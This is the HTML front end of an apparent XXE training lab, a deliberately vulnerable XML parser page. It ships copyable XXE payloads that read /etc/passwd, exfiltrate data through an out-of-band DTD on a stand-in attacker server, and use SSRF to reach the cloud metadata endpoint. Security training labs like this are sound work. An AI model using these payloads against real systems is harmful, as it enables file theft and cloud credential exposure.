@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XML Parser - XXE Lab</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #f8fafc; color: #1e293b; min-height: 100vh; }
+        .container { max-width: 900px; margin: 0 auto; padding: 2rem; }
+        header { text-align: center; margin-bottom: 2rem; }
+        h1 { font-size: 1.5rem; font-weight: 600; color: #0f172a; margin-bottom: 0.5rem; }
+        .subtitle { color: #64748b; font-size: 0.875rem; }
+        .card { background: #fff; border: 1px solid #e2e8f0; border-radius: 0.75rem; padding: 1.5rem; margin-bottom: 1.5rem; }
+        .card h2 { font-size: 1rem; font-weight: 600; margin-bottom: 1rem; color: #334155; }
+        label { display: block; font-size: 0.875rem; font-weight: 500; color: #475569; margin-bottom: 0.5rem; }
+        textarea { width: 100%; min-height: 180px; padding: 0.75rem; border: 1px solid #cbd5e1; border-radius: 0.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8125rem; resize: vertical; background: #f8fafc; color: #1e293b; }
+        textarea:focus { outline: none; border-color: #6366f1; box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1); }
+        .btn { display: inline-flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem; border: none; border-radius: 0.5rem; font-size: 0.875rem; font-weight: 500; cursor: pointer; transition: all 0.15s; }
+        .btn-primary { background: #6366f1; color: #fff; }
+        .btn-primary:hover { background: #4f46e5; }
+        .btn-secondary { background: #f1f5f9; color: #475569; border: 1px solid #e2e8f0; }
+        .btn-secondary:hover { background: #e2e8f0; }
+        .actions { display: flex; gap: 0.5rem; margin-top: 1rem; }
+        .result { margin-top: 1rem; padding: 1rem; background: #f1f5f9; border-radius: 0.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.8125rem; white-space: pre-wrap; word-break: break-all; min-height: 80px; color: #334155; }
+        .result.error { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
+        .result.success { background: #f0fdf4; color: #166534; border: 1px solid #bbf7d0; }
+        .tabs { display: flex; gap: 0.25rem; margin-bottom: 1rem; }
+        .tab { padding: 0.5rem 1rem; border: none; background: transparent; color: #64748b; font-size: 0.875rem; font-weight: 500; cursor: pointer; border-radius: 0.5rem; transition: all 0.15s; }
+        .tab.active { background: #6366f1; color: #fff; }
+        .tab:hover:not(.active) { background: #f1f5f9; }
+        .examples { margin-top: 1rem; }
+        .examples summary { font-size: 0.8125rem; color: #6366f1; cursor: pointer; font-weight: 500; }
+        .examples pre { margin-top: 0.5rem; padding: 0.75rem; background: #1e293b; color: #e2e8f0; border-radius: 0.5rem; font-size: 0.75rem; overflow-x: auto; cursor: pointer; }
+        .examples pre:hover { background: #334155; }
+        footer { text-align: center; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid #e2e8f0; color: #94a3b8; font-size: 0.75rem; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>XML Parser</h1>
+            <p class="subtitle">XML External Entity Test Application</p>
+        </header>
+
+        <div class="card">
+            <div class="tabs">
+                <button class="tab active" onclick="switchTab('parse')">XML Parser</button>
+                <button class="tab" onclick="switchTab('upload')">File Upload</button>
+            </div>
+
+            <div id="tab-parse">
+                <label for="xmlInput">XML Input</label>
+                <textarea id="xmlInput" placeholder="Enter XML here..."><?xml version="1.0" encoding="UTF-8"?>
+<book>
+  <title>Sample Book</title>
+  <author>John Doe</author>
+  <isbn>978-3-16-148410-0</isbn>
+</book></textarea>
+                <div class="actions">
+                    <button class="btn btn-primary" onclick="parseXML()">Parse XML</button>
+                    <button class="btn btn-secondary" onclick="loadExample('basic')">Basic</button>
+                    <button class="btn btn-secondary" onclick="loadExample('xxe')">XXE</button>
+                    <button class="btn btn-secondary" onclick="loadExample('blxxe')">Blind XXE</button>
+                </div>
+            </div>
+
+            <div id="tab-upload" style="display:none">
+                <label for="fileInput">Upload XML File</label>
+                <input type="file" id="fileInput" accept=".xml,.svg,.txt" style="margin-bottom: 1rem; font-size: 0.875rem;">
+                <div class="actions">
+                    <button class="btn btn-primary" onclick="uploadFile()">Upload & Parse</button>
+                </div>
+            </div>
+
+            <div id="result" class="result" style="display:none"></div>
+        </div>
+
+        <div class="card">
+            <details class="examples">
+                <summary>Example Payloads (click to expand)</summary>
+                <pre onclick="copyPayload(this)">// Basic XXE - Read /etc/passwd
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;book&gt;
+  &lt;title&gt;&amp;xxe;&lt;/title&gt;
+&lt;/book&gt;</pre>
+                <pre onclick="copyPayload(this)">// Blind XXE - OOB exfiltration
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd"&gt;
+  %dtd;
+]&gt;
+&lt;book&gt;
+  &lt;title&gt;test&lt;/title&gt;
+&lt;/book&gt;</pre>
+                <pre onclick="copyPayload(this)">// SSRF via XXE
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;book&gt;
+  &lt;title&gt;&amp;xxe;&lt;/title&gt;
+&lt;/book&gt;</pre>
+            </details>
+        </div>
+
+        <footer>
+            XXE Lab - For authorized security testing only
+        </footer>
+    </div>
+
+    <script>
+        function switchTab(tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelector(`.tab[onclick="switchTab('${tab}')"]`).classList.add('active');
+            document.getElementById('tab-parse').style.display = tab === 'parse' ? 'block' : 'none';
+            document.getElementById('tab-upload').style.display = tab === 'upload' ? 'block' : 'none';
+            document.getElementById('result').style.display = 'none';
+        }
+
+        function loadExample(type) {
+            const examples = {
+                basic: `<?xml version="1.0" encoding="UTF-8"?>\n<book>\n  <title>Sample Book</title>\n  <author>John Doe</author>\n  <isbn>978-3-16-148410-0</isbn>\n</book>`,
+                xxe: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<book>\n  <title>&xxe;</title>\n  <author>test</author>\n</book>`,
+                blxxe: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM "http://collaborator.example.com/evil.dtd">\n  %dtd;\n]>\n<book>\n  <title>blind test</title>\n</book>`
+            };
+            document.getElementById('xmlInput').value = examples[type];
+        }
+
+        async function parseXML() {
+            const xml = document.getElementById('xmlInput').value;
+            const resultEl = document.getElementById('result');
+            resultEl.style.display = 'block';
+            resultEl.className = 'result';
+            resultEl.textContent = 'Parsing...';
+
+            try {
+                const response = await fetch('/parse.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/xml' },
+                    body: xml
+                });
+                const data = await response.text();
+                resultEl.textContent = data;
+                resultEl.className = 'result success';
+            } catch (err) {
+                resultEl.textContent = 'Error: ' + err.message;
+                resultEl.className = 'result error';
+            }
+        }
+
+        async function uploadFile() {
+            const fileInput = document.getElementById('fileInput');
+            const resultEl = document.getElementById('result');
+            
+            if (!fileInput.files.length) {
+                resultEl.style.display = 'block';
+                resultEl.className = 'result error';
+                resultEl.textContent = 'Please select a file first.';
+                return;
+            }
+
+            resultEl.style.display = 'block';
+            resultEl.className = 'result';
+            resultEl.textContent = 'Uploading...';
+
+            const formData = new FormData();
+            formData.append('file', fileInput.files[0]);
+
+            try {
+                const response = await fetch('/upload.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.text();
+                resultEl.textContent = data;
+                resultEl.className = 'result success';
+            } catch (err) {
+                resultEl.textContent = 'Error: ' + err.message;
+                resultEl.className = 'result error';
+            }
+        }
+
+        function copyPayload(el) {
+            navigator.clipboard.writeText(el.textContent);
+            const orig = el.style.background;
+            el.style.background = '#166534';
+            setTimeout(() => el.style.background = orig, 500);
+        }
+    </script>
+</body>
+</html>
